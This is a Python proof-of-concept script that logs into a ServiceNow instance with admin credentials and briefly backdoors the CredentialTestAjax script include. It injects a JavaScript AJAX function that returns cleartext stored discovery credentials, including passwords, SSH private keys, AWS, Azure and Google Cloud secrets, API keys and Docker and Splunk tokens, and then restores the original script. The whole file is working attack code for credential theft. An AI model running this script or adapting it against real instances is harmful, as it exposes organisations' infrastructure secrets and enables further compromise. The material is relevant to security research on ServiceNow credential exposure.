#!/usr/bin/env python3
# /// script
# requires-python = ">=3.9"
# dependencies = [
#   "requests>=2.32.5",
# ]
# ///
"""POC backdoor of CredentialTestAjax script include to retrieve cleartext discovery_credentials in AJAX requests.

Usage:
    python dumpcred_poc.py -i https://dev12345.service-now.com -u admin -s <sys_id>
"""

import argparse
import getpass
import json
import re
import sys
from html import unescape
from pathlib import Path
from typing import Any, Optional

import requests


SCRIPT_INCLUDE_NAME = "CredentialTestAjax"
REQUEST_TIMEOUT = 15

# Kept inline so the POC has no imports from ServiceNowHound.
CRED_RETRIEVAL_FIELDS = {
    "ssh_private_key": [
        "user_name",
        "password",
        "ssh_passphrase",
        "ssh_private_key",
        "ssh_certificate",
    ],
    "ssh": ["user_name", "password"],
    "windows": ["user_name", "password"],
    "snmp": ["password"],
    "snmpv3": [
        "user_name",
        "authentication_protocol",
        "authentication_key",
        "privacy_protocol",
        "privacy_key",
        "use_context",
        "context_name",
    ],
    "vmware": ["user_name", "password"],
    "jdbc": ["user_name", "password"],
    "jms": ["user_name", "password"],
    "basic_auth": ["user_name", "password"],
    "api_key": ["api_key_header_name", "api_key_prefix", "api_key"],
    "aws": ["access_key", "secret_key"],
    "azure": ["tenant_id", "client_id", "secret_key"],
    "google_cloud": ["client_email", "private_key"],
    "cim": ["user_name", "password"],
    "azure_sas": ["sas_key_name", "sas_key"],
    "cloud_credential": [
        "user_name",
        "password",
        "ssh_passphrase",
        "ssh_private_key",
        "authentication_protocol",
        "authentication_key",
        "privacy_protocol",
        "privacy_key",
    ],
    "sys_generative_ai_custom_header_api_key": [
        "header",
        "api_key",
        "auth_algorithm",
    ],
    "docker": [
        "repository_name",
        "user_name",
        "email",
        "repository_type",
        "password",
        "server_address",
    ],
    "splunk_token": ["user_name", "password", "token", "expiration_time"],
}


class ServiceNowSession:
    def __init__(self, instance_url: str, username: str, password: str) -> None:
        self.instance_url = instance_url.rstrip("/")
        self.session = requests.Session()
        self.bigip_cookie: Optional[str] = None
        self._login(username, password)

    def _login(self, username: str, password: str) -> None:
        response = self.session.post(
            f"{self.instance_url}/login.do",
            data={
                "user_name": username,
                "user_password": password,
                "sys_action": "sysverb_login",
            },
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            allow_redirects=True,
            timeout=REQUEST_TIMEOUT,
        )
        response.raise_for_status()

        if "login.do" in response.url:
            raise RuntimeError(
                "Login failed or requires an interactive flow such as MFA/SSO"
            )

        token = extract_user_token(response.text)
        if token is None:
            nav_response = self.session.get(
                f"{self.instance_url}/navpage.do",
                timeout=REQUEST_TIMEOUT,
            )
            nav_response.raise_for_status()
            token = extract_user_token(nav_response.text)

        if token is None:
            raise RuntimeError("Login succeeded but no g_ck token was found")

        if self.session.cookies.get("JSESSIONID") is None:
            raise RuntimeError("Login succeeded but no JSESSIONID cookie was found")

        # Keep using this same Session for every follow-on request. requests
        # will replay the BIG-IP persistence cookie that pinned the login to a
        # backend node, which is required on load-balanced ServiceNow instances.
        self.bigip_cookie = extract_bigip_cookie(self.session.cookies)
        self.session.headers.update({"X-UserToken": token})

    def request(self, method: str, path: str, **kwargs: Any) -> requests.Response:
        response = self.session.request(
            method,
            f"{self.instance_url}{path}",
            timeout=REQUEST_TIMEOUT,
            **kwargs,
        )
        if not response.ok:
            body = response.text[:500].replace("\n", " ")
            raise RuntimeError(
                f"{method} {path} failed with HTTP {response.status_code}: {body}"
            )
        return response

    def query_table(self, table: str, params: dict[str, Any]) -> list[dict[str, Any]]:
        response = self.request(
            "GET",
            f"/api/now/table/{table}",
            params=params,
            headers={"Accept": "application/json"},
        )
        return response.json().get("result", [])

    def get_credential_info(self, sys_id: str) -> dict[str, Any]:
        results = self.query_table(
            "discovery_credentials",
            {
                "sysparm_fields": "sys_id,type,name",
                "sysparm_query": f"sys_id={sys_id}",
                "sysparm_limit": 1,
            },
        )
        if not results:
            raise RuntimeError(f"Credential not found: {sys_id}")
        return results[0]

    def get_script_include(self) -> dict[str, Any]:
        results = self.query_table(
            "sys_script_include",
            {
                "sysparm_fields": "sys_id,name,script",
                "sysparm_query": f"name={SCRIPT_INCLUDE_NAME}",
                "sysparm_limit": 1,
            },
        )
        if not results:
            raise RuntimeError(f"Script include not found: {SCRIPT_INCLUDE_NAME}")
        return results[0]

    def update_script_include(self, sys_id: str, script: str) -> None:
        self.request(
            "PATCH",
            f"/api/now/table/sys_script_include/{sys_id}",
            json={"script": script},
            headers={"Accept": "application/json"},
        )

    def retrieve_credential(self, sys_id: str) -> Optional[dict[str, Any]]:
        response = self.request(
            "POST",
            "/xmlhttp.do",
            data={
                "sysparm_processor": SCRIPT_INCLUDE_NAME,
                "sysparm_scope": "global",
                "sysparm_want_session_messages": "true",
                "sysparm_name": "retrieveData",
                "sysparm_credSysId": sys_id,
                "ni.nolog.x_referer": "ignore",
            },
            headers={"Accept": "application/xml"},
        )
        return parse_xmlhttp_response(response.text)


def extract_user_token(html_content: str) -> Optional[str]:
    for pattern in (
        r"var\s+g_ck\s*=\s*['\"]([^'\"]+)['\"]",
        r"g_ck\s*=\s*['\"]([^'\"]+)['\"]",
    ):
        match = re.search(pattern, html_content)
        if match:
            return match.group(1)
    return None


def extract_bigip_cookie(cookie_jar: Any) -> Optional[str]:
    for cookie in cookie_jar:
        if cookie.name.lower().startswith("bigipserverpool"):
            return f"{cookie.name}={cookie.value}"
    return None


def parse_xmlhttp_response(text: str) -> Optional[dict[str, Any]]:
    match = re.search(r'answer="(.*?)"', text, re.DOTALL)
    if not match or not match.group(1):
        return None
    return json.loads(unescape(match.group(1)))


def build_retrieve_function() -> str:
    lines = [
        "ajaxFunction_retrieveData: function() {",
        '    var credSysId = this.getParameter("sysparm_credSysId");',
        "    var provider = new sn_cc.StandardCredentialsProvider();",
        "    var credential = provider.getCredentialByID(credSysId);",
        '    if (gs.nil(credential)) return "";',
        "    var d = {};",
        '    var t = credential.getAttribute("type");',
        '    d["type"] = t;',
    ]

    for index, (cred_type, fields) in enumerate(CRED_RETRIEVAL_FIELDS.items()):
        keyword = "if" if index == 0 else "} else if"
        lines.append(f'    {keyword} (t == "{cred_type}") {{')
        for field in fields:
            lines.append(f'        d["{field}"] = credential.getAttribute("{field}");')

    lines.extend(
        [
            "    }",
            "    return JSON.stringify(d);",
            "}",
        ]
    )
    return "\n".join(lines)


def patch_script(original_script: str, retrieve_function: str) -> str:
    for marker in ("type: 'CredentialTestAjax'", 'type: "CredentialTestAjax"'):
        index = original_script.rfind(marker)
        if index != -1:
            return (
                original_script[:index]
                + retrieve_function
                + ",\n\n    "
                + original_script[index:]
            )
    raise RuntimeError("Could not find CredentialTestAjax prototype type property")


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("-i", "--instance-url", required=True)
    parser.add_argument("-u", "--user", required=True)
    parser.add_argument("-p", "--password", help="Prompted if omitted")
    parser.add_argument("-s", "--sys-id", required=True)
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    password = args.password or getpass.getpass("ServiceNow password: ")

    if not re.fullmatch(r"[0-9a-fA-F]{32}", args.sys_id):
        raise RuntimeError("--sys-id must be a 32-character hexadecimal ServiceNow sys_id")

    client = ServiceNowSession(args.instance_url, args.user, password)
    if client.bigip_cookie:
        cookie_name = client.bigip_cookie.partition("=")[0]
        print(f"[+] Captured BIG-IP affinity cookie {cookie_name}", file=sys.stderr)
    credential_info = client.get_credential_info(args.sys_id)
    script_include = client.get_script_include()
    script_include_sys_id = script_include["sys_id"]
    original_script = script_include.get("script", "")
    backup_path = Path.cwd() / f"{SCRIPT_INCLUDE_NAME}_{script_include_sys_id}.js.bak"
    backup_path.write_text(original_script, encoding="utf-8")
    print(f"[+] Saved backup to {backup_path}", file=sys.stderr)

    patch_attempted = False
    try:
        patched_script = patch_script(original_script, build_retrieve_function())
        patch_attempted = True
        client.update_script_include(script_include_sys_id, patched_script)
        print(f"[+] Patched {SCRIPT_INCLUDE_NAME}", file=sys.stderr)

        credential_data = client.retrieve_credential(args.sys_id)
        if credential_data is None:
            raise RuntimeError("No credential data returned from xmlhttp.do")

        print(
            json.dumps(
                {
                    "sys_id": args.sys_id,
                    "name": credential_info.get("name", ""),
                    "credential": credential_data,
                },
                indent=2,
            )
        )
    finally:
        if patch_attempted:
            try:
                client.update_script_include(script_include_sys_id, original_script)
                print(f"[+] Restored {SCRIPT_INCLUDE_NAME}", file=sys.stderr)
            except Exception as exc:
                print(
                    f"[-] Failed to restore {SCRIPT_INCLUDE_NAME}: {exc}",
                    file=sys.stderr,
                )
                print(f"[-] Manual restore source: {backup_path}", file=sys.stderr)
                raise

    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except (requests.RequestException, RuntimeError, KeyError, json.JSONDecodeError) as exc:
        print(f"[-] {exc}", file=sys.stderr)
        raise SystemExit(1)
